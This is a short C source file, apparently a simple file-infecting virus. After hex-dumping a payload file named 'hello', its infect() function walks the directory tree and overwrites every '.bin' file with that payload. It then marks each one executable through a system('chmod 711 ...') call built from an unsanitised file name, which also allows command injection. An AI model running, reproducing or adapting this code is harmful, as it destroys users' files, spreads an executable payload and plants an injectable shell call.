#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <dirent.h>
#include <unistd.h>
#include <fcntl.h>

#define INP_FILE		"hello"
#define MAX_SIZE		300
#define DUMP_COL_SIZE	32			// it is assumed that these two constants..
#define GROUP_SIZE		4			// ..will be a power of 2. Modify accordingly.
#define GROUP_SEP		"  "
#define FILE_EXT		".bin"
#define MAX_PATH_LEN	1024

unsigned char prog_code[MAX_SIZE];
size_t file_size, ext_len;

void file_dump()
{
	FILE *in_fh = fopen(INP_FILE, "rb");
	char col_mask = DUMP_COL_SIZE - 1, group_mask = GROUP_SIZE - 1;
	int i;
	
	if (in_fh == NULL)
	{
		fprintf(stderr, "Error opening input file: %s\n", INP_FILE);
		exit(1);
	}

	fseek(in_fh, 0, SEEK_END);
	file_size = ftell(in_fh);
	ext_len = strlen(FILE_EXT);

	fseek(in_fh, 0, SEEK_SET);
	fread(prog_code, sizeof(char), file_size, in_fh);
	fclose(in_fh);

	printf("The file dump is:\n");
	for (i = 0; i < file_size; ++i)
	{
		if ((i & col_mask) == 0)
			printf("\n");
		else if ((i & group_mask) == 0)
			printf("%s", GROUP_SEP);
		printf("%02x ", prog_code[i]);
	}
	
	printf("\n");
}


void infect(const char* directory)
{
	DIR *dir = opendir(directory);
	struct dirent *entry;

	if (dir == NULL)
	{
		fprintf(stderr, "Unable to open the directory %s\n", directory);
		exit(1);
	}

	while ((entry = readdir(dir)) != NULL)
	{
		if (entry->d_type == DT_DIR)	// Directory
		{
			char path[MAX_PATH_LEN];

			if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
				continue;

			snprintf(path, sizeof(path), "%s/%s", directory, entry->d_name);
			infect(path);
		}
		else							// File
		{
			size_t len = strlen(entry->d_name);
			if (strncasecmp(entry->d_name + len - ext_len, FILE_EXT, ext_len) == 0)
			{
				char f_name[MAX_PATH_LEN];
				char command[MAX_PATH_LEN  + 32];
				snprintf(f_name, sizeof(f_name), "%s/%s", directory, entry->d_name);

				FILE* out_fh = fopen(f_name, "wb");

				if (out_fh == NULL)
				{
					fprintf(stderr, "Error opening %s\n", f_name);
					exit(1);
				}

				fwrite(prog_code, sizeof(char), file_size, out_fh);

				fclose(out_fh);
				snprintf(command, sizeof(command), "chmod 711 %s", f_name);
				system(command);
			}
		}			
	}

	closedir(dir);
}


int main()
{
	file_dump();
	infect(".");
	return 0;
}
